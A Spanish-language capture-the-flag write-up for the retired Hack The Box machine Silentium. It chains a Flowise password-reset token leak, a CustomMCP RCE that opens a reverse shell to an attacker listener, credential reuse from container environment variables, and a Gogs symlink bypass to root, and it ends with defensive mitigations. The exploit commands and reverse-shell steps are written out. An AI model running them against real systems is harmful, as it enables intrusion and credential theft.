Silentium es una máquina Linux de dificultad fácil cuya cadena de compromiso encadena varias vulnerabilidades recientes: un account takeover en Flowise, un RCE que cae dentro de un contenedor Docker, un pivote por reutilización de credenciales hacia el host real, y una escalada a root a través de una instancia de Gogs corriendo como root. El hilo conductor es un patrón de reutilización de secretos en cascada.

🏁

Máquina retirada. Silentium ya salió de Hack The Box, así que este writeup incluye las flags, contraseñas y tokens reales. Usá el botón revelar para mostrarlos.

01.#Reconocimiento

nmap · whatweb · fuzzing de vhosts

El escaneo completo de puertos revela solo dos servicios: 22 (SSH) y 80 (HTTP). Con una superficie tan reducida, el HTTP es el candidato natural. El servidor responde con una redirección por Host header hacia silentium.htb, así que ese dominio se agrega al archivo de hosts para poder navegarlo.

nmap
nmap -p- --open -sS -sC -sV --min-rate 5000 -Pn -oN scan.txt 10.129.245.103
22/tcp open  ssh     OpenSSH 9.6p1 (Ubuntu)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
# HTTP → redirige por Host header a silentium.htb
echo "10.129.245.103 silentium.htb" | sudo tee -a /etc/hosts

whatweb muestra un sitio institucional — «Institutional Capital & Lending Solutions» — que aparenta ser un template corporativo sin mucha funcionalidad. Cuando el sitio principal no ofrece superficie, el siguiente paso es buscar vhosts: fuzzing del Host header para descubrir subdominios servidos por el mismo nginx.

vhost fuzzing
whatweb http://silentium.htb/
200 OK · nginx/1.24.0 · Title: Silentium | Institutional Capital & Lending Solutions
ffuf -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" \
     -w subdomains-top1million-5000.txt -fs 178
staging    [Status: 200, Size: 3142]   # → staging.silentium.htb
🧭 Idea clave

Ante una superficie mínima (solo SSH+HTTP) y un sitio principal «de cartón», el vhost fuzzing por Host header suele ser lo que destapa el verdadero punto de entrada.

02.#Enumeración y descubrimiento de Flowise

identificación de versión · investigación de CVEs

El vhost staging.silentium.htb aloja una instancia de Flowise, un constructor visual de agentes de IA (Node.js + React) con el login expuesto. Flowise deja endpoints de API públicos que permiten fingerprint exacto de la versión — dato que decide qué exploits aplican.

fingerprint
curl -s http://staging.silentium.htb/api/v1/ping
pong
curl -s http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}

La versión 3.0.5 cae de lleno en el rango vulnerable de dos CVEs que se encadenan: una da acceso sin autenticación, la otra convierte ese acceso en ejecución de comandos. Ambas quedaron parcheadas en la 3.0.6.

🎯 CVE-2025-58434

Fuga de tempToken en el endpoint de forgot-password → permite resetear la contraseña de cualquier usuario sin autenticación. Afecta Flowise ≤ 3.0.5.

🎯 CVE-2025-59528

RCE crítico (CVSS 10.0) vía el nodo CustomMCP: el mcpServerConfig se inyecta en Function(). Afecta < 3.0.6. Requiere una sesión válida — que obtenemos con la CVE anterior.

03.#Account takeover — CVE-2025-58434

OSINT → leak de tempToken → reset de contraseña

¿Qué usuario resetear? La página «Institutional Leadership» del sitio principal lista al equipo: Marcus Thorne, Elena Rossi y Ben — «Head of Financial Systems». Ben es el único sin apellido, y su rol (infraestructura de sistemas internos) encaja con ser el dueño de Flowise. Apuesta: ben@silentium.htb.

El endpoint de recuperación tiene un detalle de formato: el body va anidado en user (el intento plano {"email":...} devuelve 500). Con el formato correcto, la respuesta confirma que Ben existe (es la cuenta admin) y filtra sin autenticación su id, su hash bcrypt actual y — lo importante — un tempToken con expiración muy corta.

account takeover
# 1) el backend espera el email anidado en user.email
curl -s -X POST .../api/v1/account/forgot-password \
  -H 'Content-Type: application/json' \
  -d '{"user":{"email":"ben@silentium.htb"}}'
name:      admin
bcrypt:    $2a$05$…
tempToken: tempToken   # ventana corta → usar rápido
# 2) reset con el token filtrado → fijamos una password conocida
curl -s -X POST .../api/v1/account/reset-password \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"…","password":"…"}}'
login OK en el panel de Flowise
🔑 Credencial obtenida

ben@silentium.htb · password — contraseña que fijamos nosotros con el reset. No hizo falta crackear el bcrypt.

04.#RCE y foothold — CVE-2025-59528

CustomMCP → reverse shell (contenedor Docker)

Con sesión válida entra en juego la segunda CVE. Un PoC público (UsifAraby/CVE-2025-59528-POC) abusa del nodo CustomMCP: primero --mode check confirma que la instancia es vulnerable, luego --mode revshell inyecta el payload y dispara una reverse shell contra nuestro listener.

foothold
python3 exploit.py -t http://staging.silentium.htb/ --mode check \
  --email ben@silentium.htb --password …
[+] vulnerable (3.0.5)
python3 exploit.py -t http://staging.silentium.htb/ --mode revshell \
  --lhost 10.10.15.6 --lport 4444 --email ben@silentium.htb --password …
nc -lvnp 4444   → connect from 10.129.245.103
id
uid=0(root) gid=0(root)   # root… pero, ¿root de qué?

El id dice root, pero varias señales delatan que no es el host: el prompt / # sin tty, grupos raros (floppy, tape, video), un hostname tipo c78c3cceb7ba y, sobre todo, la presencia de /.dockerenv. Estamos dentro de un contenedor Docker.

ℹ Nota

Ser root dentro de un contenedor no es root en la máquina. Antes de cantar victoria, siempre confirmar el entorno (hostname, /proc/1/cgroup, .dockerenv, ip a). El objetivo ahora es pivotear al host real.

05.#Pivote por credenciales y user.txt

secretos en env → reutilización de contraseña → SSH

Dentro del contenedor, env es una mina: expone en texto plano las credenciales de Flowise (FLOWISE_USERNAME/PASSWORD) y las del servicio SMTP (SMTP_USER/PASSWORD). La clave del reto es probar esas contraseñas contra SSH del host — reutilización de credenciales.

credential reuse
env | grep -iE 'pass|smtp|user'
FLOWISE_PASSWORD=****   # probada en SSH → NO funciona
SMTP_USER=test  SMTP_PASSWORD=****   # ← esta sí
ssh ben@10.129.245.103
Welcome — acceso al host real como ben
cat ~/user.txt

La contraseña de Flowise falla en SSH, pero la de SMTP resulta estar reutilizada como la contraseña de sistema de ben. Login por SSH al host real → user.txt.

🚫 Caminos descartados

sudo -l → «ben may not run sudo». find / -perm -4000 (SUID) → solo binarios estándar del sistema, nada explotable. La escalada no va por ahí.

06.#Post-explotación y descubrimiento de Gogs

linpeas · tercer vhost · servicio como root

Con linpeas en el host se descartan primero los vectores obvios: ben no está en el grupo docker, y los CVEs de kernel quedan como plan B (sin confirmar explotabilidad). El hallazgo bueno está en la config de nginx: un tercer vhost nunca mapeado por el fuzzing inicial.

enum
cat /etc/nginx/sites-available/staging-v2-code
server_name staging-v2-code.dev.silentium.htb;
proxy_pass  http://127.0.0.1:3001;
ps -ef | grep gogs
root  1261  /opt/gogs/gogs/gogs web
cat /opt/gogs/gogs/custom/conf/app.ini
RUN_USER = root   ·   DISABLE_REGISTRATION = false
/opt/gogs/gogs/gogs --version
Gogs version 0.13.3

El vhost hace proxy a un Gogs (git self-hosted) local, y app.ini — legible por ben — confirma lo crítico: RUN_USER = root y el registro de cuentas habilitado. Un servicio git corriendo como root significa que cualquier RCE contra él es root directo. La versión 0.13.3 es la pieza final.

🚫 Camino descartado

Reutilizar las contraseñas conocidas contra el login de Gogs (18 combinaciones de usuario/password) → todas fallan. No hay cuenta pre-existente; hay que registrar una nueva.

⚙ Vector alternativo

linpeas también marcó PackageKit 1.2.8 vulnerable a CVE-2026-41651 «Pack2TheRoot» (race condition TOCTOU en polkit). Quedó como plan B — Gogs fue el camino más rápido y fiable.

07.#Escalada a root — CVE-2025-8110

symlink bypass en PutContents de Gogs → RCE root

Gogs 0.13.3 es vulnerable a CVE-2025-8110 (un bypass por symlink de la CVE-2024-55947). La API PUT .../contents/<file> valida el nombre del path pero no el destino de un symlink. La cadena: registrar cuenta → crear repo → commitear un symlink malicious_link → .git/config → llamar PutContents sobre él, que sobrescribe el .git/config real inyectando un sshCommand. La siguiente operación de Git ejecuta ese comando — y como Gogs es root, el RCE es root directo.

🐛 Detalle que cuesta horas

El PoC fallaba con «CSRF token not found» por una barra final en la URL: base_url + "/user/login" generaba //user/login, que nginx/Gogs no resuelven igual y devuelve una página sin el formulario. Fix: correr -u SIN barra final.

El registro pide un captcha de imagen simple, así que se crea la cuenta desde el navegador (más cómodo que scriptearlo) y luego el PoC específico para esta máquina (hassan-hamadi/CVE-2025-8110-Silentium-HTB) completa la cadena de golpe.

09.#Detección y mitigación (Blue Team)

cómo se rompe la cadena desde el otro lado

Parchear y exponer menos

Actualizar Flowise a ≥ 3.0.6 y Gogs a ≥ 0.13.4 cierra las tres CVEs. Los entornos «staging» y «dev» no deberían ser alcanzables desde internet — segmentarlos o exigir VPN/allowlist.

No reutilizar credenciales

La caída en cascada (app → env → SMTP → sistema) se rompe con contraseñas únicas por servicio y un gestor de secretos. Nada de secretos en variables de entorno en texto plano dentro de contenedores.

Mínimo privilegio

Gogs corriendo como root convierte un RCE de usuario en compromiso total. Los servicios deben correr con una cuenta dedicada sin privilegios y en contenedores sin capacidades extra.

Detección

Alertar sobre: ráfagas de llamadas a forgot-password, procesos hijos anómalos de Node/Gogs (sh -c, nc, bash -i), conexiones salientes desde servicios que normalmente no las hacen, y escrituras a .git/config vía la API.
